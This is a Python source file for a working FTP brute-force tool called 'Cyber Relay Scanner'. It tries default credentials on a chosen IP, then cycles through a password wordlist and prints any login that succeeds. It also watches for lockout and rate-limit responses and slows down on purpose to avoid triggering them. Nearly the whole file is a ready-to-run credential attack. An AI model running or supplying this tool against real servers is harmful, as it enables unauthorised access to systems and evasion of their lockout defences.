from rich.console import Console, Group
from rich.table import Table
from rich.live import Live
from rich.spinner import Spinner
from tqdm import tqdm
import ftplib
import time
import sys
import argparse
import socket

console = Console()
TEST_MODE = False

def try_ftp_login(ip, username, password, delay=0.5, max_retries=2, timeout_tracker=None, lockout_tracker=None):
    password = password.strip()
    console.print(f"[cyan][DEBUG][/cyan] Trying FTP login with: {username}:{password}")

    for attempt in range(max_retries):
        try:
            with ftplib.FTP(ip, timeout=10) as ftp:
                ftp.login(user=username, passwd=password)
                console.print(f"[bold green][SUCCESS][/bold green] Logged in with [cyan]{username}:{password}[/cyan]")
                if timeout_tracker:
                    timeout_tracker['consecutive_timeouts'] = 0
                if lockout_tracker:
                    lockout_tracker['lockout_hits'] = 0
                return True
        except ftplib.error_perm as e:
            msg = str(e)
            console.print(f"[red][FAILED][/red] {username}:{password} - {msg}")
            if any(code in msg for code in ["530", "421", "450"]):
                if lockout_tracker:
                    lockout_tracker['lockout_hits'] += 1
            break
        except ftplib.error_temp as e:
            msg = str(e)
            console.print(f"[yellow][TEMP ERROR][/yellow] {username}:{password} - {msg}")
            if any(code in msg for code in ["421", "450"]):
                if lockout_tracker:
                    lockout_tracker['lockout_hits'] += 1
            time.sleep(1)
        except socket.timeout:
            console.print(f"[bold red][TIMEOUT][/bold red] Connection to {ip} timed out on attempt {attempt+1}")
            if timeout_tracker:
                timeout_tracker['consecutive_timeouts'] += 1
            time.sleep(1)
        except Exception as e:
            console.print(f"[bold red][FAILURE][/bold red] Could not connect to FTP server at {ip}")
            console.print(f"Reason: {e}")
            break

    time.sleep(delay)
    return False

def brute_force_ftp(ip, username, wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        console.print(f"[bold red][ERROR][/bold red] Failed to load wordlist: {e}")
        return

    spinner = Spinner("dots", text="Trying passwords...")
    found_password = None
    timeout_tracker = {'consecutive_timeouts': 0}
    lockout_tracker = {'lockout_hits': 0}
    live = Live(spinner, refresh_per_second=12, transient=True)
    live.start()

    progress = tqdm(
        passwords,
        desc="Brute-forcing",
        unit="pw",
        bar_format="{l_bar}{bar} | {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]",
        ncols=80,
        ascii=" █"
    )

    for i, password in enumerate(progress):
        if timeout_tracker['consecutive_timeouts'] >= 3:
            console.print(f"[yellow][WARNING][/yellow] 3+ timeouts in a row. Relay may be rate limiting. Slowing down...")
            time.sleep(2)
            timeout_tracker['consecutive_timeouts'] = 0

        if lockout_tracker['lockout_hits'] >= 3:
            console.print(f"[yellow][WARNING][/yellow] Multiple lockout-like responses (530, 421). Slowing down to avoid trigger...")
            time.sleep(3)
            lockout_tracker['lockout_hits'] = 0

        table = Table(title="Brute-Force Status")
        table.add_column("Status", justify="left")
        table.add_row(f"[bold blue]Attempt {i+1} of {len(passwords)}[/bold blue]")
        table.add_row(f"[white]Trying password:[/] [cyan]{password}[/cyan]")

        group = Group(spinner, table)
        live.update(group)

        if TEST_MODE and password == "naruto":
            console.print(f"\n[bold green][SIMULATED SUCCESS][/bold green] Login with [cyan]{username}:{password}[/cyan]")
            found_password = password
            break

        if try_ftp_login(ip, username, password, delay=0.5, timeout_tracker=timeout_tracker, lockout_tracker=lockout_tracker):
            found_password = password
            break

    live.stop()

    if found_password:
        console.print(f"\n[bold green]✅ Login Successful[/bold green]")
        console.print(f"[bold green]→ Credentials: [cyan]{username}:{found_password}[/cyan][/bold green]\n")
    else:
        console.print(f"\n[bold red]❌ No valid FTP credentials found.[/bold red]\n")

def run_ftp_auth_test(ip, username="FTPUSER", password="TAIL", wordlist_path=None):
    if TEST_MODE:
        console.print(f"[bold yellow][TEST MODE][/bold yellow] Simulated FTP test running...")
        if username == "FTPUSER" and password == "TAIL":
            console.print(f"[bold green][SIMULATED SUCCESS][/bold green] Login with [cyan]{username}:{password}[/cyan]")
            return
        else:
            console.print(f"[bold red][SIMULATED FAILED][/bold red] {username}:{password} incorrect. Proceeding to brute-force test...")
            if wordlist_path:
                brute_force_ftp(ip, username, wordlist_path)
            else:
                console.print(f"[bold red]No wordlist provided in test mode.[/bold red]")
        return

    console.print(f"[bold yellow][INFO][/bold yellow] Testing FTP login with default credentials...\n")
    if not try_ftp_login(ip, username, password):
        if wordlist_path:
            console.print(f"[bold yellow][INFO][/bold yellow] Default login failed. Starting brute-force with wordlist.")
            brute_force_ftp(ip, username, wordlist_path)
        else:
            console.print(f"[bold red]No valid credentials and no wordlist provided. Skipping brute-force.[/bold red]")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Cyber Relay Scanner with FTP Auth")
    parser.add_argument("relay_ip", help="Relay IP address or 'demo'")
    parser.add_argument("--username", help="FTP username", default="FTPUSER")
    parser.add_argument("--password", help="FTP password (skip brute-force if provided)")
    parser.add_argument("--ftpwordlist", help="Optional FTP wordlist to use if login fails")
    parser.add_argument("--test", action="store_true", help="Enable test mode")

    args = parser.parse_args()
    relay_ip = args.relay_ip
    TEST_MODE = args.test

    run_ftp_auth_test(
        ip=relay_ip,
        username=args.username,
        password=args.password if args.password else "TAIL",
        wordlist_path=args.ftpwordlist
    )